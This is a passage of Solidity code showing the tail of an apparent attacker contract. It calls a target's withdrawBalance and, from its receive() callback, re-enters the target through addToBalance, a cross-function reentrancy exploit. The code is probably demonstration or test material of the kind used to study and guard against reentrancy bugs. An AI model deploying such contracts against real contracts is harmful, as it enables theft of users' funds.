        attacking = true;
        target.withdrawBalance();
        attacking = false;
    }

    receive() external payable {
        if (attacking && msg.sender == address(target)) {
            // Re-entrant deposit into C
            target.addToBalance{value: address(this).balance}();
        }
    }
}

